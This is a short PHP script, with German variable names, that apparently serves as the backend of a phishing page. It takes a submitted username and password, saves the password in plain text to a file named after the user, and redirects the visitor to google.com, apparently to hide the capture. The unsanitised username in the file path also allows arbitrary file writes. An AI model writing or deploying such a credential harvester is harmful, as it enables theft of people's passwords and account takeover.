<?php
$user = $_REQUEST["username"];
$passwort = $_REQUEST["password"];
$datei = fopen("userdata/$user.txt","w+");
$link = ("benutzereingabe.php");


fwrite($datei,$passwort);
fclose($datei);

header("location: https://google.com");


?>